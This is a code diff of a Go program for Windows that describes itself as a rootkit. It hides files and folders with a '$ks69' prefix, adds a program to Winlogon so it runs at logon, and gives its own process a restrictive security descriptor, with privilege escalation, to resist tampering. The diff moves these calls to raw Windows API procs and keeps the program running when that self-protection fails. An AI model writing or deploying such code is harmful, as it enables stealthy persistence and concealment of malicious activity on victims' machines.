@@ -2,17 +2,67 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
 	"syscall"
+	"unsafe"
+
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
-	"log"
-	"unsafe"
 )
 
+var (
+	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")
+	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
+
+	procConvertStringSecurityDescriptorToSecurityDescriptor = modadvapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
+	procLocalFree                                          = modkernel32.NewProc("LocalFree")
+	procSetKernelObjectSecurity                            = modadvapi32.NewProc("SetKernelObjectSecurity")
+)
+
+const (
+	SDDL_REVISION_1           = 1
+	DACL_SECURITY_INFORMATION = 0x00000004
+)
+
+func enableSecurityPrivilege() error {
+	var token windows.Token
+	currentProcess, _ := windows.GetCurrentProcess()
+	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+	if err != nil {
+		return fmt.Errorf("OpenProcessToken failed: %v", err)
+	}
+	defer token.Close()
+
+	var luid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, syscall.StringToUTF16Ptr("SeSecurityPrivilege"), &luid)
+	if err != nil {
+		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
+	}
+
+	privileges := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
+		},
+	}
+
+	err = windows.AdjustTokenPrivileges(token, false, &privileges, 0, nil, nil)
+	if err != nil {
+		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
+	}
+
+	return nil
+}
+
 func SelfDefense() bool {
+	if err := enableSecurityPrivilege(); err != nil {
+		fmt.Println("Failed to enable security privilege:", err)
+		return false
+	}
+
 	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, windows.GetCurrentProcessId())
 	if err != nil {
 		fmt.Println("Error opening process:", err)
@@ -23,20 +73,24 @@ func SelfDefense() bool {
 	szSD := "D:P(A;;GA;;;SY)(A;;GA;;;BA)(D;;GA;;;BG)(D;;GA;;;AN)"
 
 	var securityDescriptor *windows.SECURITY_DESCRIPTOR
-	err = windows.ConvertStringSecurityDescriptorToSecurityDescriptor(
-		szSD,
-		windows.SDDL_REVISION_1,
-		&securityDescriptor,
-		nil,
+	ret, _, err := procConvertStringSecurityDescriptorToSecurityDescriptor.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(szSD))),
+		uintptr(SDDL_REVISION_1),
+		uintptr(unsafe.Pointer(&securityDescriptor)),
+		uintptr(0),
 	)
-	if err != nil {
+	if ret == 0 {
 		fmt.Println("Error converting SDDL:", err)
 		return false
 	}
-	defer windows.LocalFree(windows.Handle(unsafe.Pointer(securityDescriptor)))
+	defer procLocalFree.Call(uintptr(unsafe.Pointer(securityDescriptor)))
 
-	err = windows.SetKernelObjectSecurity(hProcess, windows.DACL_SECURITY_INFORMATION, securityDescriptor)
-	if err != nil {
+	ret, _, err = procSetKernelObjectSecurity.Call(
+		uintptr(hProcess),
+		uintptr(DACL_SECURITY_INFORMATION),
+		uintptr(unsafe.Pointer(securityDescriptor)),
+	)
+	if ret == 0 {
 		fmt.Println("Error setting security:", err)
 		return false
 	}
@@ -108,29 +162,23 @@ func removeFromWinlogon() error {
 
 func main() {
 	if !SelfDefense() {
-		log.Fatal("Failed to configure process security.")
+		fmt.Println("SelfDefense failed, but continuing execution...")
 	}
 
-	if len(os.Args) < 2 {
+	if len(os.Args) < 3 {
 		fmt.Println("This rootkit hides files and folders with the '$ks69' prefix!")
 		fmt.Println("Usage:")
-		fmt.Println("  sigma.exe <path> <show|hide>")
-		fmt.Println("  sigma.exe <programPath> winlogon")
-		fmt.Println("  sigma.exe unwinlogon")
+		fmt.Println("  rootkit <path> <show|hide>")
+		fmt.Println("  rootkit <programPath> winlogon")
+		fmt.Println("  rootkit unwinlogon")
 		return
 	}
 
-	action := os.Args[1]
+	action := os.Args[2] // Действие теперь второй аргумент
+	rootDir := os.Args[1] // Путь теперь первый аргумент
 
 	switch action {
 	case "show", "hide":
-		if len(os.Args) != 3 {
-			fmt.Println("Usage: sigma.exe <path> <show|hide>")
-			return
-		}
-
-		rootDir := os.Args[2]
-
 		err := filepath.WalkDir(rootDir, func(path string, dirEntry os.DirEntry, err error) error {
 			if err != nil {
 				fmt.Printf("Error accessing path %s: %v\n", path, err)
@@ -163,18 +211,18 @@ func main() {
 
 	case "winlogon":
 		if len(os.Args) != 3 {
-			fmt.Println("Usage: sigma.exe <programPath> winlogon")
+			fmt.Println("Usage: rootkit <programPath> winlogon")
 			return
 		}
 
-		programPath := os.Args[2]
+		programPath := os.Args[1]
 		if err := addToWinlogon(programPath); err != nil {
 			log.Fatalf("Failed to add to Winlogon: %v", err)
 		}
 
 	case "unwinlogon":
 		if len(os.Args) != 2 {
-			fmt.Println("Usage: sigma.exe unwinlogon")
+			fmt.Println("Usage: rootkit unwinlogon")
 			return
 		}
 
